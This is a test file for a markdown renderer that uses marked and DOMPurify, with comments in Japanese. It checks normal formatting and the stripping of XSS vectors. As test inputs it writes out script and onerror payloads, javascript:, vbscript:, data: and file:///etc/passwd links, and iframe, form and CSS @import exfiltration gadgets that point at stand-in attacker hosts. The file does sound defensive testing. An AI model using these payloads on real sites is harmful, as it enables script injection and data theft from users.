import { describe, expect, it } from "vitest";
import { renderMarkdownToSafeHtml } from "../src/lib/markdown";

/**
 * Issue #661: metadata.json の markdown を sanitize 済 HTML として render する。
 * marked + DOMPurify の組合せが script / iframe / on-event handler を確実に剥がし、
 * かつ heading / list / table / code を維持することを pin する。
 */
describe("renderMarkdownToSafeHtml (Issue #661)", () => {
  it("should convert headings to HTML such as <h1>", () => {
    const html = renderMarkdownToSafeHtml("## 学習目的");
    expect(html).toMatch(/<h2[^>]*>学習目的<\/h2>/);
  });

  it("should convert bullet lists to <ul><li>", () => {
    const html = renderMarkdownToSafeHtml("- 一つ目\n- 二つ目");
    expect(html).toContain("<ul>");
    expect(html).toContain("<li>一つ目</li>");
    expect(html).toContain("<li>二つ目</li>");
  });

  it("should convert tables to <table>", () => {
    const md = "| a | b |\n|---|---|\n| 1 | 2 |";
    const html = renderMarkdownToSafeHtml(md);
    expect(html).toContain("<table>");
    expect(html).toContain("<th>a</th>");
  });

  it("should convert code blocks to <pre><code>", () => {
    const html = renderMarkdownToSafeHtml("```\nconst x = 1;\n```");
    expect(html).toMatch(/<pre>[\s\S]*<code>[\s\S]*const x = 1;/);
  });

  it("XSS: should strip <script>", () => {
    const html = renderMarkdownToSafeHtml("Hello <script>alert(1)</script> world");
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("alert(1)");
  });

  it("XSS: should strip onerror handler", () => {
    const html = renderMarkdownToSafeHtml('<img src=x onerror="alert(1)">');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(1)");
  });

  it("XSS: should strip javascript: scheme", () => {
    const html = renderMarkdownToSafeHtml("[click](javascript:alert(1))");
    // marked が href 化、 DOMPurify が javascript: scheme を中和
    expect(html).not.toMatch(/href="javascript:/);
  });

  it("should wrap inline code in <code>", () => {
    const html = renderMarkdownToSafeHtml("use `npm install` to ...");
    expect(html).toContain("<code>npm install</code>");
  });

  describe("Issue #865: DOMPurify allowlist hardening", () => {
    it("should strip data: URL scheme from href (= data:text/html;base64 XSS gadget defense)", () => {
      const html = renderMarkdownToSafeHtml(
        "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
      );
      expect(html).not.toMatch(/href="data:/);
    });

    it("should strip vbscript: scheme from href", () => {
      const html = renderMarkdownToSafeHtml("[click](vbscript:msgbox(1))");
      expect(html).not.toMatch(/href="vbscript:/);
    });

    it("should strip file: scheme from href", () => {
      const html = renderMarkdownToSafeHtml("[click](file:///etc/passwd)");
      expect(html).not.toMatch(/href="file:/);
    });

    it("should strip <iframe> since it is not in ALLOWED_TAGS", () => {
      const html = renderMarkdownToSafeHtml(
        '<iframe src="https://attacker.evil.com"></iframe>Hello',
      );
      expect(html).not.toContain("<iframe");
      expect(html).toContain("Hello");
    });

    it("should strip <form action> (= clickjacking / data exfil gadget)", () => {
      const html = renderMarkdownToSafeHtml('<form action="https://attacker"><input></form>');
      expect(html).not.toContain("<form");
    });

    it("should strip <style> (= CSS-based exfil)", () => {
      const html = renderMarkdownToSafeHtml("<style>@import url(https://attacker/exfil)</style>Hi");
      expect(html).not.toContain("<style");
      expect(html).toContain("Hi");
    });

    it("should strip onclick attribute via FORBID_ATTR", () => {
      const html = renderMarkdownToSafeHtml(
        '<a href="https://example.com" onclick="alert(1)">x</a>',
      );
      expect(html).not.toContain("onclick");
    });

    it("should preserve normal https:// links", () => {
      const html = renderMarkdownToSafeHtml("[docs](https://example.com/docs)");
      expect(html).toMatch(/href="https:\/\/example\.com\/docs"/);
    });

    it("should preserve mailto: links", () => {
      const html = renderMarkdownToSafeHtml("[mail](mailto:a@example.com)");
      expect(html).toMatch(/href="mailto:a@example\.com"/);
    });
  });
});
